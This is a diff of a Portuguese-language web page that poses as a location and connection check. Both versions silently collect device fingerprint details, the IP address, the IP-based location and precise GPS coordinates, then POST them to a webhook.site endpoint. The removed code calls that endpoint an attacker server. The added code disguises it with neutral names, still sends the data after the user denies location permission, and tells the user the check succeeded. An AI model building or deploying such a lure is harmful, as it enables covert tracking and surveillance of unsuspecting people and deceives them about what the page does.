@@ -1,126 +1,162 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificar Localização</title>
-    <style>
-        body { font-family: sans-serif; line-height: 1.6; padding: 20px; background-color: #f4f4f4; }
-        .container { max-width: 600px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
-        h1 { color: #333; }
-        .status { padding: 10px; margin: 10px 0; border-radius: 4px; }
-        .success { background-color: #d4edda; color: #155724; }
-        .error { background-color: #f8d7da; color: #721c24; }
-        .data { background-color: #e9ecef; padding: 10px; border-radius: 4px; font-family: monospace; white-space: pre-wrap; }
-        button { background-color: #007bff; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
-        button:hover { background-color: #0056b3; }
-        .hidden { display: none; }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verificar Localização</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      line-height: 1.6;
+      background-color: #f4f4f9;
+      margin: 0;
+      padding: 20px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .container {
+      background: #fff;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      max-width: 500px;
+      width: 100%;
+      text-align: center;
+    }
+    .btn {
+      background-color: #007bff;
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      font-size: 16px;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    .btn:hover {
+      background-color: #0056b3;
+    }
+    .status {
+      margin-top: 20px;
+      font-weight: bold;
+    }
+    .oculto {
+      display: none;
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <h1>📍 Verificação de Localização</h1>
-        <p>Clique no botão abaixo para verificar sua localização atual e o status da sua conexão.</p>
-        
-        <button id="trackBtn">Iniciar Verificação</button>
-        
-        <div id="statusMsg" class="status hidden"></div>
-        <div id="dataOutput" class="data hidden"></div>
-    </div>
 
-    <script>
-        document.getElementById('trackBtn').addEventListener('click', async function() {
-            const statusMsg = document.getElementById('statusMsg');
-            const dataOutput = document.getElementById('dataOutput');
-            
-            // Limpar estados anteriores
-            statusMsg.className = 'status hidden';
-            dataOutput.className = 'data hidden';
+  <div class="container">
+    <h2>Verificação de Localização</h2>
+    <p>Clique no botão abaixo para verificar a sua localização e o estado da conexão.</p>
+    <button id="btn-iniciar" class="btn">Verificar Localização</button>
 
-            // 1. Coletar dados básicos
-            const basicData = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screen: `${screen.width}x${screen.height}`,
-                colorDepth: screen.colorDepth,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                online: navigator.onLine,
-                battery: await getBatteryInfo()
-            };
+    <div id="status" class="status oculto"></div>
+    <div id="saida_dados" class="oculto"></div>
+  </div>
 
-            // 2. Coletar IP (via API pública)
-            try {
-                const ipResponse = await fetch('https://ipapi.co/json/');
-                const ipData = await ipResponse.json();
-                basicData.ip = ipData.ip;
-                basicData.city = ipData.city;
-                basicData.country = ipData.country_name;
-                basicData.lat_approx = ipData.latitude;
-                basicData.lon_approx = ipData.longitude;
-            } catch (e) {
-                basicData.ip = "Erro ao obter IP";
-            }
+  <script>
+    const btnIniciar = document.getElementById('btn-iniciar');
+    const msgStatus = document.getElementById('status');
+    const saidaDados = document.getElementById('saida_dados');
 
-            // 3. Coletar Geolocalização Precisa (GPS/Wi-Fi)
-            statusMsg.textContent = "Aguardando permissão de localização...";
-            statusMsg.className = 'status';
-            
-            return new Promise((resolve) => {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        basicData.lat_exact = position.coords.latitude;
-                        basicData.lon_exact = position.coords.longitude;
-                        basicData.accuracy = position.coords.accuracy;
-                        basicData.timestamp = new Date(position.timestamp).toISOString();
-                        
-                        statusMsg.textContent = "Localização obtida com sucesso!";
-                        statusMsg.className = 'status success';
-                        
-                        // Exibir dados localmente para o usuário
-                        dataOutput.textContent = JSON.stringify(basicData, null, 2);
-                        dataOutput.className = 'data';
-                        
-                        // 4. Enviar para o seu "Servidor"
-                        sendToAttackerServer(basicData);
-                        resolve();
-                    },
-                    (error) => {
-                        basicData.geo_error = error.message;
-                        statusMsg.textContent = "Erro ao obter localização: " + error.message;
-                        statusMsg.className = 'status error';
-                        
-                        // Ainda assim, envia os dados básicos (IP, UserAgent)
-                        dataOutput.textContent = JSON.stringify(basicData, null, 2);
-                        dataOutput.className = 'data';
-                        sendToAttackerServer(basicData);
-                        resolve();
-                    },
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                );
-            });
+    // URL do seu Webhook
+    const WEBHOOK_URL = 'https://webhook.site/3e64b456-7cb2-417a-96bd-82bba682b80d/26ba0598-9411-40ca-b946-9b21b8658867';
+
+    btnIniciar.addEventListener('click', async () => {
+      msgStatus.classList.remove('oculto');
+      msgStatus.textContent = 'A recolher dados...';
+
+      // 1. Dados Básicos do Dispositivo / Navegador
+      const dados = {
+        plataforma: navigator.platform,
+        idioma: navigator.language,
+        profundidade_cor: screen.colorDepth,
+        resolucao: `${screen.width}x${screen.height}`,
+        fuso_horario: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        data_hora: new Date().toISOString()
+      };
+
+      // Informações da Bateria (se suportado)
+      if (navigator.getBattery) {
+        try {
+          const bateria = await navigator.getBattery();
+          dados.bateria_nivel = `${(bateria.level * 100).toFixed(0)}%`;
+          dados.bateria_carregando = bateria.charging;
+        } catch (e) {
+          dados.bateria_erro = 'Não suportado ou bloqueado';
+        }
+      }
+
+      // 2. Coletar IP e Localização por IP (ipapi.co)
+      try {
+        const respostaIp = await fetch('https://ipapi.co/json/');
+        const dadosIp = await respostaIp.json();
+        dados.ip = dadosIp.ip;
+        dados.ip_cidade = dadosIp.city;
+        dados.ip_regiao = dadosIp.region;
+        dados.ip_pais = dadosIp.country_name;
+        dados.ip_provedor = dadosIp.org;
+        dados.ip_latitude = dadosIp.latitude;
+        dados.ip_longitude = dadosIp.longitude;
+      } catch (e) {
+        dados.ip_erro = 'Falha ao obter dados por IP';
+      }
+
+      // 3. Coletar Geolocalização Exata (GPS / Wi-Fi)
+      msgStatus.textContent = 'A aguardar permissão de localização...';
+
+      if ('geolocation' in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          async (posicao) => {
+            // Sucesso na captura do GPS
+            dados.gps_latitude = posicao.coords.latitude;
+            dados.gps_longitude = posicao.coords.longitude;
+            dados.gps_precisao_metros = posicao.coords.accuracy;
+            dados.gps_altitude = posicao.coords.altitude;
+            dados.gps_timestamp = new Date(posicao.timestamp).toISOString();
+
+            msgStatus.textContent = 'Localização obtida com sucesso!';
+            await enviarDados(dados);
+          },
+          async (erro) => {
+            // Falha / Permissão Negada
+            dados.gps_erro = erro.message;
+            dados.gps_erro_codigo = erro.code;
+            msgStatus.textContent = 'Permissão negada ou falha ao obter GPS. A enviar dados básicos...';
+            await enviarDados(dados);
+          },
+          {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+          }
+        );
+      } else {
+        dados.gps_erro = 'Geolocalização não suportada pelo navegador.';
+        await enviarDados(dados);
+      }
+    });
+
+    // 4. Função para Enviar os Dados ao Webhook
+    async function enviarDados(payload) {
+      try {
+        await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(payload)
         });
-
-        async function getBatteryInfo() {
-            if (navigator.getBattery) {
-                const battery = await navigator.getBattery();
-                return {
-                    level: battery.level,
-                    charging: battery.charging
-                };
-            }
-            return null;
-        }
-
-        function sendToAttackerServer(data) {
-            const ATTACKER_ENDPOINT = 'https://webhook.site/3e64b456-7cb2-417a-96bd-82fba682b80d'; 
-            
-            fetch(ATTACKER_ENDPOINT, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            }).catch(console.error);
-        }
-    </script>
+        msgStatus.textContent = 'Concluído com sucesso!';
+      } catch (erro) {
+        console.error('Erro ao enviar dados:', erro);
+        msgStatus.textContent = 'Erro ao sincronizar informações.';
+      }
+    }
+  </script>
 </body>
 </html>
